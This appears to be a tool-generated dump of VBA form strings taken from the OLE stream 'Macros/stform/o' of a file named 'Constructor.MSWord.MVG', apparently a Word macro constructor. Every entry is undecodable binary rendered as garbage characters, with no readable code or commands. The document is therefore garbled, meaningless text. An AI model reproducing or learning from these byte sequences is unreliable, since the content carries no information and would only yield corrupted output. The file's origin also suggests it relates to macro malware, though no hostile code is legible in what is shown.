VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V���W�NJ1���I�����.^Li�kN���>�lx�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�{�������vJM�S��p���k�D��p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^'V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�_u[�v|��.w������k�k˝uk[M?-���+�M�b���\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bw��O�[w�G�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ឧ����&��|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k����x�����Q[�Ǻ�OjM�S�K�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/]��W�������i�kY���W��̦�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�\�=a
ޞ� �m�Ͷ)�;��m����}�Z{tGr9p��� ���-�=>�^^x�}��o��Z�,S�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}G�x�{>Tsy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n֗ܮ./��<�?,�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k����I¼G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
${��T5>���yJ,�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�	[5�]Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�]g�ix�N�[}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g��}��֟
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y���l\lJ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#H���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<xt���f��_3y̞S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g��dKm4G!V��m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RIj܏=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y����n�+���^-��Z��{�?��W�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�f3�ur�Ri鯌hqz��B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g�^����?w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�>��j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��vݘ�������M6fd�eN�Em��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��¦���c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǭ�eq�wѷ�b��)���k��X�|{��uP���f��T�m������{/,ώ�/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�H�k��3޿yb�k���ʒ�ʥ�zI'������6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ov[[����K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v\����슍�ũX��ɧ%���4G��qLS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mm��G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��mq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�6�/�M�7�-n6��;а�Ɍ7�O�}W�8ʨ�{�/�Í�ǖ��1��W����m���|�<�3,�LU�m>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��wY�<�>�i�v�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T���ѿg�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:g�Ę��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5/�y�ݕ��>_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y	�)�U���- �5�ܵ�_kim丸��=<�Km�m�?��T��+&JDZ�>�k{姧P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��y,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o���l�^E�dң��.ʠ����y.~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ϫX��m��'f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ծ}�w�~w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�N�މ��:/f�#�����6�x�Oz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���]��;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E^��չG|�w?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S���b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L����⧚��c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.ۋ���T��{ޛw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g��)l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׿��~O�����LOgN~v����S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���_+���ٻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}Hx�����y�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cٻo��o���z~_�Fk�M�wi�����O]����Qw~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j��ۙ�)�KII�0�]�c��y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{ю�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ۻ�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]v�Ћ�q��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��K#\�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZKH�k�?es���{��87îl:�W�~�?j�{��H��<6L�gc]�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�f�T���r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T)�Q�mI�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�ߵ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�~o��Y"���b�o�7��[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
⩏M{w�;�n��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F���ʟSW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߲ryw�$a��S��k��U��dwcHh=��6���:���m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%����q�^m#�����lg���ܦ�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|���#����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n���Nf�Ikf�5���[~�җ�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|s�2��_�^��b�=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�piy�m�V�y�'���'7�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wy�r����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��2�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����i���Rm��ǱV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nj<�Ɏ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݏ;\v�+#\�M#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_kE�'�7O̲V#JR/�wWj���o�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��0�p呑dᤚ򸤒I��L��qc%u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�q�}9ӎNne8��BiWc�RZ%�Q����<z��ے�������3k�[���}���G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����WU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�۲/kӧB������tV>Mo����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�����ls�b�֢
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��_#��6O>G�_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pp��M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����ϯ�~_�9��on>J�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��y.<��j_]/jc�mZxmo��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;3�̷
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�NE/l�/�^����Ŗ�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��YP��lv��4�&�;V�n?��wI�=U)-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6��>�n-�4�{���%3L��1�gav�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gF�_%�}-��m0��(1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sb�ǲ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�Tw˒'Z���4�ݡ��s���~�#,�_���G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�M#�_�1��;u�/���Zo�����Ȫ�N4�8�.�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o����pn�6�L'��ٯ�Wp��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k���JQNqVW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i$�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k{���x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N
��?"���g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%	��QoX�}߼T�٫�m�4�ڨp��e�گ���2��b��'�b�����lQ�l|XY��zVϫ�J1Q��9K]dM��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;mݣ�����Gc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`ܣc�~dO\8��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fomc���/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~^.���-��~��U�[�(J�SI�)����x�7�����Mb�����ÿ��0�n?Vݓ��G3����_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�u�7�^l�W8©�=�1JU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n:8��]����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���x����V\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&�֍ݵ�w���|�׉������m���lW�����S�R��m�;�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o/�C������[4�O�;n��)�s�UQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j���{"{/*�g��u���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y��y��=ߢ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��G�v�
�-m|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?E�^u����V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������M��Z?�����5��v�j�9-��\�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�T�-d�V�i�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�-q�[IF���
-------------------------------------------------------------------------------
